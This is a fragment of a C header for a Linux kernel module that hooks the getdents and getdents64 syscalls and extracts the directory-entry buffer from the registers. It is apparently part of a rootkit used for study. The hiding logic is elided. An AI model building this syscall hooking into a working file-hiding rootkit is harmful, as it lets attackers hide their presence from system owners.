#ifndef HOOK_GETDENT_H
#define HOOK_GETDENT_H

#include <linux/syscalls.h> /* syscall recognized (struct linux_dirent64) */
#include <linux/dirent.h>   /* directory */
...
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    ...
    // int fd = ARG1(regs, int);
    struct linux_dirent64 __user *dirent = ARG2(regs, struct linux_dirent64 *);
    // int count = ARG3(regs, int);
...
asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    ...
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = ARG1(regs, int);
    struct linux_dirent *dirent = ARG2(regs, struct linux_dirent *);
    // int count = ARG3(regs, int);
